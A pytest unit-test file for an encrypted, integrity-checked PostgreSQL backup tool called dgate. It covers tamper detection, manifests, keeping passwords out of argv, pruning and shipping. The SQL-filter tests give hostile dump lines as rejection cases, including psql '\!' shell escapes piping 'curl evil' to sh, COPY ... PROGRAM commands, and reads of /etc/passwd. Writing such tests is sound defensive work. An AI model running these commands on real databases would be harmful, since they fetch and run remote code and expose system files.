"""Encrypted, integrity-checked backups.

Unit tests only: no network, no Postgres. pg_dump is replaced by a fake that
yields a fixed SQL script, so what is exercised is everything dgate does around
it -- the file format, the manifest, the filter in front of psql, and the rule
that a password never appears in an argument list.
"""

from __future__ import annotations

import gzip
import io
import json
import os
import struct
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from dgate.ops import backup, backup_keys
from dgate.rawstore import FileRawStore

BITS = 3072          # the smallest key the loader accepts; keeps the tests quick


@pytest.fixture(scope="module")
def pair():
    private = rsa.generate_private_key(public_exponent=65537, key_size=BITS)
    return private, private.public_key()


@pytest.fixture(scope="module")
def stranger():
    return rsa.generate_private_key(public_exponent=65537, key_size=BITS)


def _pem_files(tmp_path: Path, private, name: str = "k") -> tuple[Path, Path]:
    pub = tmp_path / f"{name}-public.pem"
    priv = tmp_path / f"{name}-private.pem"
    pub.write_bytes(private.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
    priv.write_bytes(private.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))
    return pub, priv


def _encrypt(data: bytes, public, chunk: int = backup.CHUNK) -> bytes:
    out = io.BytesIO()
    backup.encrypt_stream(io.BytesIO(data), out, public, chunk)
    return out.getvalue()


def _decrypt(blob: bytes, private) -> bytes:
    out = io.BytesIO()
    backup.decrypt_stream(io.BytesIO(blob), out, private)
    return out.getvalue()


def _frame_spans(blob: bytes) -> list[tuple[int, int]]:
    """(start, end) of every frame, header excluded."""
    _, wrapped, _ = backup._read_header(io.BytesIO(blob))
    pos = 7 + len(wrapped) + backup.NONCE_PREFIX
    spans = []
    while pos < len(blob):
        (length,) = struct.unpack(">I", blob[pos + 1:pos + 5])
        spans.append((pos, pos + 5 + length))
        pos += 5 + length
    return spans


# ------------------------------------------------------ round trip, bounds

def test_a_few_mebibytes_round_trip(pair):
    private, public = pair
    data = os.urandom(3 * backup.CHUNK) + b"compressible " * 200_000 + os.urandom(123)
    blob = _encrypt(data, public)
    assert data[:64] not in blob
    assert _decrypt(blob, private) == data
    info = backup.scan(io.BytesIO(blob))
    assert info["frames"] == -(-len(data) // backup.CHUNK)
    assert info["gzip_bytes"] == len(data)


def test_an_empty_input_is_one_final_frame(pair):
    private, public = pair
    blob = _encrypt(b"", public)
    assert backup.scan(io.BytesIO(blob))["frames"] == 1
    assert _decrypt(blob, private) == b""


def test_the_writer_never_holds_more_than_a_frame_plus_one_write(pair):
    """640 MB must cost the same memory as 1 MB."""
    _, public = pair
    sink = io.BytesIO()
    writer = backup._EncryptingWriter(sink, public)
    piece = os.urandom(64 * 1024)
    peak = 0
    for _ in range(3 * backup.CHUNK // len(piece) + 5):
        writer.write(piece)
        peak = max(peak, len(writer._buf))
    writer.close()
    assert peak <= backup.CHUNK
    assert backup.scan(io.BytesIO(sink.getvalue()))["frames"] >= 4


def test_every_file_gets_its_own_key_and_nonce_prefix(pair):
    _, public = pair
    a, b = _encrypt(b"same", public), _encrypt(b"same", public)
    assert a != b
    assert a[:4] == backup.MAGIC and a[4] == backup.FORMAT_VERSION


# ------------------------------------------------------------- tampering

@pytest.fixture()
def small(pair):
    """Five 1 KiB frames: small enough to cut and rearrange by hand."""
    private, public = pair
    data = os.urandom(4 * 1024 + 100)
    blob = _encrypt(data, public, chunk=1024)
    assert len(_frame_spans(blob)) == 5
    return private, data, blob


def test_the_untouched_small_file_decrypts(small):
    private, data, blob = small
    assert _decrypt(blob, private) == data


def test_a_flipped_ciphertext_byte_is_rejected(small):
    private, _, blob = small
    start, end = _frame_spans(blob)[2]
    bad = bytearray(blob)
    bad[start + 5 + 10] ^= 1
    with pytest.raises(backup.BackupFormatError, match="frame 2 failed authentication"):
        _decrypt(bytes(bad), private)


def test_a_flipped_final_marker_is_rejected(small):
    private, _, blob = small
    start, _ = _frame_spans(blob)[-1]
    bad = bytearray(blob)
    bad[start] = 0
    with pytest.raises(backup.BackupFormatError):
        _decrypt(bytes(bad), private)


def test_a_file_cut_at_a_frame_boundary_is_rejected(small):
    """The attack GCM alone does not stop: drop the tail, every frame left is
    individually genuine. The final marker is what catches it."""
    private, _, blob = small
    cut = _frame_spans(blob)[-1][0]
    with pytest.raises(backup.BackupFormatError, match="truncated"):
        _decrypt(blob[:cut], private)
    with pytest.raises(backup.BackupFormatError, match="truncated"):
        backup.scan(io.BytesIO(blob[:cut]))


def test_a_file_cut_mid_frame_is_rejected(small):
    private, _, blob = small
    with pytest.raises(backup.BackupFormatError, match="truncated"):
        _decrypt(blob[:len(blob) - 7], private)


def test_reordered_frames_are_rejected(small):
    private, _, blob = small
    spans = _frame_spans(blob)
    (a0, a1), (b0, b1) = spans[1], spans[2]
    assert a1 - a0 == b1 - b0                       # same length: a clean swap
    swapped = blob[:a0] + blob[b0:b1] + blob[a0:a1] + blob[b1:]
    with pytest.raises(backup.BackupFormatError, match="failed authentication"):
        _decrypt(swapped, private)


def test_a_duplicated_frame_is_rejected(small):
    private, _, blob = small
    a0, a1 = _frame_spans(blob)[1]
    with pytest.raises(backup.BackupFormatError):
        _decrypt(blob[:a1] + blob[a0:a1] + blob[a1:], private)


def test_data_after_the_final_frame_is_rejected(small):
    private, _, blob = small
    with pytest.raises(backup.BackupFormatError, match="after the final frame"):
        _decrypt(blob + b"x", private)


def test_the_wrong_private_key_fails(small, stranger):
    _, _, blob = small
    with pytest.raises(backup.BackupFormatError, match="wrong private key"):
        _decrypt(blob, stranger)


def test_something_that_is_not_a_backup_is_rejected(pair):
    private, _ = pair
    for junk in (b"", b"DGBK", b"not a backup at all", b"\x1f\x8b" + b"\0" * 50):
        with pytest.raises(backup.BackupFormatError):
            _decrypt(junk, private)


def test_a_hostile_length_field_is_not_trusted(small):
    private, _, blob = small
    start, _ = _frame_spans(blob)[0]
    bad = bytearray(blob)
    bad[start + 1:start + 5] = struct.pack(">I", 2 ** 31)
    with pytest.raises(backup.BackupFormatError, match="implausible length"):
        backup.scan(io.BytesIO(bytes(bad)))


# -------------------------------------------------------------- manifest

def _enc_dump(directory: Path, days_ago: int, public, sql: bytes = b"SELECT 1;\n") -> backup.Backup:
    taken = datetime.now(timezone.utc) - timedelta(days=days_ago)
    path = directory / f"dgate-{taken.strftime(backup.STAMP)}{backup.SUFFIX_ENC}"
    path.write_bytes(_encrypt(gzip.compress(sql), public))
    backup._write_manifest(path, path.name, taken, "dgate", 3, backup.key_fingerprint(public))
    return backup.Backup(path, taken, path.stat().st_size)


def test_the_manifest_describes_the_file(tmp_path, pair):
    _, public = pair
    dump = _enc_dump(tmp_path, 0, public)
    document = backup.check_manifest(dump.path)
    assert document["file"] == dump.path.name
    assert document["size"] == dump.bytes
    assert document["database"] == "dgate" and document["schema_migrations"] == 3
    assert document["key_fingerprint"] == backup.key_fingerprint(public)
    assert dump.manifest.name == dump.path.name.replace(".sql.gz.enc", ".manifest.json")


def test_a_manifest_mismatch_is_rejected(tmp_path, pair):
    _, public = pair
    dump = _enc_dump(tmp_path, 0, public)
    raw = bytearray(dump.path.read_bytes())
    raw[-3] ^= 1                                    # same size, different bytes
    dump.path.write_bytes(bytes(raw))
    with pytest.raises(RuntimeError, match="sha256"):
        backup.check_manifest(dump.path)

    dump.path.write_bytes(bytes(raw) + b"x")        # different size
    with pytest.raises(RuntimeError, match="bytes"):
        backup.check_manifest(dump.path)


def test_a_missing_manifest_is_rejected(tmp_path, pair):
    _, public = pair
    dump = _enc_dump(tmp_path, 0, public)
    dump.manifest.unlink()
    with pytest.raises(RuntimeError, match="missing"):
        backup.check_manifest(dump.path)
    with pytest.raises(RuntimeError, match="missing"):
        backup.verify(dump, dsn="postgresql://u:p@h/d")   # stops before any connection


def test_a_manifest_for_another_file_is_rejected(tmp_path, pair):
    _, public = pair
    one, two = _enc_dump(tmp_path, 0, public), _enc_dump(tmp_path, 5, public)
    one.manifest.write_text(two.manifest.read_text())
    with pytest.raises(RuntimeError, match="does not describe"):
        backup.check_manifest(one.path)


def test_verify_without_the_private_key_checks_hash_and_structure(tmp_path, pair, monkeypatch):
    _, public = pair
    monkeypatch.delenv("DGATE_BACKUP_PRIVATE_KEY_FILE", raising=False)
    dump = _enc_dump(tmp_path, 0, public)
    # No DSN, no database: it must not need one to say the file is whole.
    result = backup.verify(dump, dsn="postgresql://nobody@127.0.0.1:1/none")
    assert result == {"manifest": 1, "frames": 1, "gzip_bytes": result["gzip_bytes"]}


def test_verify_refuses_a_damaged_shipped_file(tmp_path, pair):
    _, public = pair
    dump = _enc_dump(tmp_path, 0, public)
    raw = bytearray(dump.path.read_bytes())
    raw[len(raw) // 2] ^= 1
    dump.path.write_bytes(bytes(raw))
    with pytest.raises(RuntimeError, match="sha256"):
        backup.verify(dump)


# ------------------------------------------------------------ SQL filter

PG_DUMP_EXCERPT = b"""--
-- PostgreSQL database dump
--

\\restrict aB3dE5fG7h

SET statement_timeout = 0;
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);

CREATE EXTENSION IF NOT EXISTS pg_trgm WITH SCHEMA public;

COMMENT ON EXTENSION pg_trgm IS 'text similarity measurement and index searching based on trigrams';

CREATE FUNCTION public.norm(s text) RETURNS text
    LANGUAGE plpgsql IMMUTABLE
    AS $$
BEGIN
    s := regexp_replace(s, '(^|\\s)' || 'x' || '(\\s|$)', ' ', 'g');
    RETURN btrim(regexp_replace(s, '\\s+', ' ', 'g'));
END;
$$;

CREATE TABLE public.opportunity (
    id bigint NOT NULL,
    title text
);

COPY public.opportunity (id, title) FROM stdin;
1\tfire \\N extinguishers
2\t\\\\server
\\N\tnull id
\\.
ALTER TABLE ONLY public.opportunity ADD CONSTRAINT opportunity_pkey PRIMARY KEY (id);

\\unrestrict aB3dE5fG7h
"""


def _passes(sql: bytes, **kw) -> bytes:
    return b"".join(backup.filter_dump(io.BytesIO(sql), **kw))


def test_a_normal_pg_dump_excerpt_passes_unchanged():
    assert _passes(PG_DUMP_EXCERPT) == PG_DUMP_EXCERPT


def test_a_planted_shell_escape_is_rejected():
    with pytest.raises(backup.UnsafeDump, match="meta-command"):
        _passes(b"SELECT 1;\n\\! id\nSELECT 2;\n")
    with pytest.raises(backup.UnsafeDump, match="meta-command"):
        _passes(b"   \\! curl evil | sh\n")


def test_a_backslash_command_after_a_statement_on_the_same_line_is_rejected():
    with pytest.raises(backup.UnsafeDump, match="backslash"):
        _passes(b"SELECT 1 \\! id\n")
    with pytest.raises(backup.UnsafeDump, match="backslash"):
        _passes(b"SELECT 'a' \\gexec\n")


def test_a_command_hidden_after_a_string_that_looks_open_is_still_seen():
    # `'\\'` is a complete string under standard_conforming_strings.
    with pytest.raises(backup.UnsafeDump):
        _passes(b"SELECT '\\' \\! id --'\n")


@pytest.mark.parametrize("statement", [
    b"COPY public.t TO PROGRAM 'id > /tmp/x';\n",
    b"COPY public.t FROM PROGRAM 'curl evil | sh';\n",
    b"copy public.t to program 'id';\n",
    b"COPY public.t TO\nPROGRAM 'id';\n",
    b"SELECT 1; COPY t FROM PROGRAM 'id';\n",
    b"COPY public.t FROM '/etc/passwd';\n",
    b"COPY (SELECT 1) TO STDOUT;\n",
    b"ALTER SYSTEM SET archive_command = 'id';\n",
    b"CREATE DATABASE other;\n",
    b"CREATE EXTENSION dblink;\n",
    b"SELECT pg_read_file('/etc/passwd');\n",
    b"SELECT set_config('standard_conforming_strings', 'off', false);\n",
])
def test_dangerous_statements_are_rejected(statement):
    with pytest.raises(backup.UnsafeDump):
        _passes(statement)


def test_a_program_clause_hidden_in_a_function_body_is_rejected():
    with pytest.raises(backup.UnsafeDump, match="not allowed"):
        _passes(b"DO $x$ BEGIN\n  COPY t TO PROGRAM 'id';\nEND $x$;\n")


def test_a_command_after_the_copy_terminator_is_rejected():
    sql = b"COPY public.t (a) FROM stdin;\n1\n\\.\n\\! id\n"
    with pytest.raises(backup.UnsafeDump, match="meta-command"):
        _passes(sql)


def test_copy_data_that_looks_like_a_command_is_just_data():
    sql = b"COPY public.t (a) FROM stdin;\n\\! id\n\\N\n\\.\nSELECT 1;\n"
    assert _passes(sql) == sql


def test_an_odd_copy_terminator_is_rejected():
    for end in (b"\\.\r\n", b"\\. \n", b"\\.x\n"):
        with pytest.raises(backup.UnsafeDump, match="terminator"):
            _passes(b"COPY public.t (a) FROM stdin;\n1\n" + end + b"\\! id\n\\.\n")


def test_a_dump_that_ends_inside_a_copy_block_is_rejected():
    with pytest.raises(backup.UnsafeDump, match="truncated"):
        _passes(b"COPY public.t (a) FROM stdin;\n1\n2\n")


def test_connect_is_only_allowed_to_the_scratch_database():
    """pg_dump writes \\connect only with --create; a planted one aimed at the
    production database would restore into production."""
    with pytest.raises(backup.UnsafeDump):
        _passes(b"\\connect dgate\n")
    with pytest.raises(backup.UnsafeDump):
        _passes(b"\\connect dgate\n", allow_connect=("dgate_verify_010203",))
    assert _passes(b"\\connect dgate_verify_010203\n",
                   allow_connect=("dgate_verify_010203",)) == b"\\connect dgate_verify_010203\n"


def test_an_overlong_statement_line_is_rejected_but_long_copy_rows_are_data():
    with pytest.raises(backup.UnsafeDump, match="longer"):
        _passes(b"SELECT '" + b"a" * (backup.MAX_SQL_LINE + 10) + b"';\n")
    row = b"x" * (backup.MAX_SQL_LINE * 2 + 5)
    sql = b"COPY public.t (a) FROM stdin;\n" + row + b"\n\\.\n"
    assert _passes(sql) == sql


# ----------------------------------------------- no password in an argv

class _FakePopen:
    calls: list[tuple[list[str], dict]] = []

    def __init__(self, argv, **kwargs):
        type(self).calls.append((list(argv), kwargs))
        self.stdout = io.BytesIO(b"CREATE TABLE t (a int);\n")
        self.returncode = 0

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def wait(self):
        return 0


@pytest.fixture()
def fake_pg_dump(monkeypatch):
    _FakePopen.calls = []
    monkeypatch.setattr(backup.subprocess, "Popen", _FakePopen)
    monkeypatch.setattr(backup, "_require", lambda tool: tool)
    monkeypatch.setattr(backup, "_schema_migrations_count", lambda dsn: 7)
    for name in ("DGATE_BACKUP_PUBLIC_KEY", "DGATE_BACKUP_ALLOW_PLAINTEXT",
                 "DGATE_ENV", "DGATE_RAW_BACKEND", "PGPASSWORD"):
        monkeypatch.delenv(name, raising=False)
    return _FakePopen


DSN = "postgresql://dgate_app:S3cr%40t-pw@db.internal:5432/dgate?sslmode=require&password=Other"


def test_the_password_is_in_the_environment_not_in_argv(fake_pg_dump, tmp_path, pair, monkeypatch):
    public_path, _ = _pem_files(tmp_path, pair[0])
    monkeypatch.setenv("DGATE_BACKUP_PUBLIC_KEY", str(public_path))
    backup.create(DSN, tmp_path / "out")
    (argv, kwargs), = fake_pg_dump.calls
    joined = " ".join(argv)
    assert "S3cr" not in joined and "Other" not in joined and "t-pw" not in joined
    assert not any("password" in part.lower() for part in argv)
    assert any(part.startswith("postgresql://dgate_app@db.internal:5432/dgate") for part in argv)
    assert "sslmode=require" in joined
    assert kwargs["env"]["PGPASSWORD"] == "S3cr@t-pw"


def test_psql_gets_the_same_treatment(monkeypatch):
    monkeypatch.setattr(backup, "_require", lambda tool: tool)
    scratch = backup.with_database(DSN.split("?")[0], "dgate_verify_010101")
    argv = backup._psql_argv(backup._pg_dsn(scratch))
    assert "S3cr" not in " ".join(argv)
    assert "--no-psqlrc" in argv and "ON_ERROR_STOP=1" in argv
    assert backup._pg_env(scratch)["PGPASSWORD"] == "S3cr@t-pw"


def test_a_dsn_without_a_password_leaves_the_environment_alone(monkeypatch):
    monkeypatch.setenv("PGPASSWORD", "from-the-environment")
    assert backup._pg_env("postgresql://u@h/d")["PGPASSWORD"] == "from-the-environment"
    assert backup._pg_dsn("postgresql://u@h/d") == "postgresql://u@h/d"


# ------------------------------------------------- create, and its refusals

@pytest.mark.parametrize("env", [{"DGATE_ENV": "production"}, {"DGATE_RAW_BACKEND": "sftp"}, {}])
def test_create_without_a_public_key_fails_loudly(fake_pg_dump, tmp_path, monkeypatch, env):
    for key, value in env.items():
        monkeypatch.setenv(key, value)
    with pytest.raises(RuntimeError, match="DGATE_BACKUP_PUBLIC_KEY"):
        backup.create(DSN, tmp_path / "out")
    assert fake_pg_dump.calls == []                  # it never touched the database
    assert list((tmp_path / "out").glob("*")) == []


def test_plaintext_is_written_only_when_explicitly_allowed(fake_pg_dump, tmp_path, monkeypatch):
    monkeypatch.setenv("DGATE_BACKUP_ALLOW_PLAINTEXT", "1")
    result = backup.create(DSN, tmp_path)
    assert result.path.name.endswith(".sql.gz") and not result.encrypted
    assert gzip.decompress(result.path.read_bytes()) == b"CREATE TABLE t (a int);\n"
    assert backup.check_manifest(result.path)["encrypted"] is False


def test_an_encrypted_dump_round_trips_and_has_a_manifest(fake_pg_dump, tmp_path, pair, monkeypatch):
    private, _ = pair
    public_path, private_path = _pem_files(tmp_path, private)
    monkeypatch.setenv("DGATE_BACKUP_PUBLIC_KEY", str(public_path))
    result = backup.create(DSN, tmp_path / "out")
    assert result.encrypted and result.path.name.endswith(".sql.gz.enc")
    assert b"CREATE TABLE" not in result.path.read_bytes()
    manifest = backup.check_manifest(result.path)
    assert manifest["schema_migrations"] == 7 and manifest["database"] == "dgate"
    assert not list((tmp_path / "out").glob("*.partial"))

    out = io.BytesIO()
    with open(result.path, "rb") as src:
        backup.decrypt_stream(src, out, backup.load_private_key(private_path))
    assert gzip.decompress(out.getvalue()) == b"CREATE TABLE t (a int);\n"


def test_a_failed_pg_dump_leaves_nothing_behind(fake_pg_dump, tmp_path, pair, monkeypatch):
    public_path, _ = _pem_files(tmp_path, pair[0])
    monkeypatch.setenv("DGATE_BACKUP_PUBLIC_KEY", str(public_path))
    monkeypatch.setattr(fake_pg_dump, "wait", lambda self: 1)
    with pytest.raises(RuntimeError, match="pg_dump failed"):
        backup.create(DSN, tmp_path / "out")
    assert list((tmp_path / "out").glob("*")) == []


def test_a_weak_public_key_is_refused(tmp_path):
    weak = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_path, _ = _pem_files(tmp_path, weak, "weak")
    with pytest.raises(RuntimeError, match="at least"):
        backup.load_public_key(public_path)


# ------------------------------------- both file types, listing and pruning

def _plain(directory: Path, days_ago: int) -> backup.Backup:
    taken = datetime.now(timezone.utc) - timedelta(days=days_ago)
    path = directory / f"dgate-{taken.strftime(backup.STAMP)}.sql.gz"
    path.write_bytes(b"legacy plaintext dump")
    return backup.Backup(path, taken, path.stat().st_size)


def test_listing_sees_both_kinds_and_ignores_manifests_and_partials(tmp_path, pair):
    _, public = pair
    legacy, enc = _plain(tmp_path, 9), _enc_dump(tmp_path, 1, public)
    (tmp_path / "dgate-20260101T000000Z.sql.gz.enc.partial").write_bytes(b"x")
    found = backup.listing(tmp_path)
    assert [b.path for b in found] == [legacy.path, enc.path]
    assert [b.encrypted for b in found] == [False, True]
    assert backup.newest(tmp_path).path == enc.path


def test_pruning_removes_manifests_with_their_dumps_and_keeps_the_newest(tmp_path, pair):
    _, public = pair
    old_plain, old_enc = _plain(tmp_path, 90), _enc_dump(tmp_path, 60, public)
    recent = _enc_dump(tmp_path, 2, public)
    removed = backup.prune(keep_days=30, directory=tmp_path)
    assert set(removed) == {old_plain.path, old_enc.path}
    assert not old_enc.manifest.exists()
    assert recent.path.exists() and recent.manifest.exists()


def test_the_newest_dump_is_never_pruned_whichever_kind_it_is(tmp_path, pair):
    _, public = pair
    ancient_enc = _enc_dump(tmp_path, 400, public)
    ancient_plain = _plain(tmp_path, 500)
    assert backup.prune(keep_days=30, directory=tmp_path) == [ancient_plain.path]
    assert ancient_enc.path.exists() and ancient_enc.manifest.exists()

    only_plain = tmp_path / "plain"
    only_plain.mkdir()
    keep = _plain(only_plain, 400)
    assert backup.prune(keep_days=30, directory=only_plain) == []
    assert keep.path.exists()


def test_ship_sends_the_manifest_first_and_both_are_listed_off_site(tmp_path, pair):
    _, public = pair
    store = FileRawStore(tmp_path / "store")
    legacy = _plain(tmp_path, 5)
    enc = _enc_dump(tmp_path, 0, public)
    backup.ship(legacy, store)                       # no manifest: a warning, not an error
    key = backup.ship(enc, store)
    assert key == f"backups/{enc.path.name}"
    assert store.size(f"backups/{enc.manifest.name}") == enc.manifest.stat().st_size
    assert [k for k, _ in backup.offsite_listing(store)] == [
        f"backups/{legacy.path.name}", key]


def test_an_encrypted_dump_is_not_shipped_without_its_manifest(tmp_path, pair):
    _, public = pair
    enc = _enc_dump(tmp_path, 0, public)
    enc.manifest.unlink()
    with pytest.raises(RuntimeError, match="missing"):
        backup.ship(enc, FileRawStore(tmp_path / "store"))
    assert not (tmp_path / "store" / "backups").exists()


def test_off_site_pruning_handles_both_and_removes_manifests(tmp_path, pair):
    _, public = pair
    store = FileRawStore(tmp_path / "store")
    old_plain = backup.ship(_plain(tmp_path, 90), store)
    old_enc_dump = _enc_dump(tmp_path, 60, public)
    old_enc = backup.ship(old_enc_dump, store)
    newest = _enc_dump(tmp_path, 1, public)
    recent = backup.ship(newest, store)
    removed = backup.prune_offsite(keep_days=30, store=store)
    assert set(removed) == {old_plain, old_enc}
    assert store.size(f"backups/{old_enc_dump.manifest.name}") is None
    assert store.size(recent) is not None
    assert store.size(f"backups/{newest.manifest.name}") is not None

    only = FileRawStore(tmp_path / "only")
    ancient = backup.ship(_enc_dump(tmp_path, 400, public), only)
    assert backup.prune_offsite(keep_days=30, store=only) == []
    assert only.size(ancient) is not None


def test_fetching_the_newest_shipped_dump_brings_its_manifest(tmp_path, pair):
    _, public = pair
    store = FileRawStore(tmp_path / "store")
    backup.ship(_enc_dump(tmp_path, 4, public), store)
    newest = _enc_dump(tmp_path, 0, public)
    backup.ship(newest, store)
    fetched = backup.fetch_offsite(tmp_path / "restore", store)
    assert fetched.path.name == newest.path.name
    assert backup.check_manifest(fetched.path)["sha256"] == backup._sha256_file(newest.path)


# ------------------------------------------------------- the key tool

def test_generate_then_encrypt_then_decrypt_with_the_cli(tmp_path, monkeypatch, capsys, fake_pg_dump):
    keys = tmp_path / "keys"
    assert backup_keys.main(["generate", "--out-dir", str(keys)]) == 0
    printed = capsys.readouterr().out
    private_path, public_path = keys / "backup-private.pem", keys / "backup-public.pem"
    fingerprint = backup.key_fingerprint(backup.load_public_key(public_path))
    assert fingerprint in printed and str(private_path) in printed
    assert "BEGIN" not in printed                    # never the key material
    if os.name != "nt":
        assert (private_path.stat().st_mode & 0o777) == 0o600
    assert backup.load_public_key(public_path).key_size == 4096

    with pytest.raises(SystemExit, match="already exists"):
        backup_keys.main(["generate", "--out-dir", str(keys)])

    monkeypatch.setenv("DGATE_BACKUP_PUBLIC_KEY", str(public_path))
    made = backup.create(DSN, tmp_path / "out")
    restored = tmp_path / "restored.sql.gz"
    assert backup_keys.main(["decrypt", "--private-key", str(private_path),
                             "--in", str(made.path), "--out", str(restored)]) == 0
    assert gzip.decompress(restored.read_bytes()) == b"CREATE TABLE t (a int);\n"

    # A damaged input leaves no output file behind.
    damaged = tmp_path / "damaged.sql.gz.enc"
    raw = bytearray(made.path.read_bytes())
    raw[-5] ^= 1
    damaged.write_bytes(bytes(raw))
    target = tmp_path / "never.sql.gz"
    assert backup_keys.main(["decrypt", "--private-key", str(private_path),
                             "--in", str(damaged), "--out", str(target)]) == 1
    assert not target.exists() and not (tmp_path / "never.sql.gz.partial").exists()


def test_generate_refuses_to_write_inside_a_git_work_tree(tmp_path):
    (tmp_path / "repo" / ".git").mkdir(parents=True)
    with pytest.raises(SystemExit, match="git work tree"):
        backup_keys.generate(tmp_path / "repo" / "keys")


def test_manifest_file_is_plain_json(tmp_path, pair):
    _, public = pair
    dump = _enc_dump(tmp_path, 0, public)
    document = json.loads(dump.manifest.read_text())
    assert set(document) >= {"file", "size", "sha256", "created_at", "database",
                             "schema_migrations"}
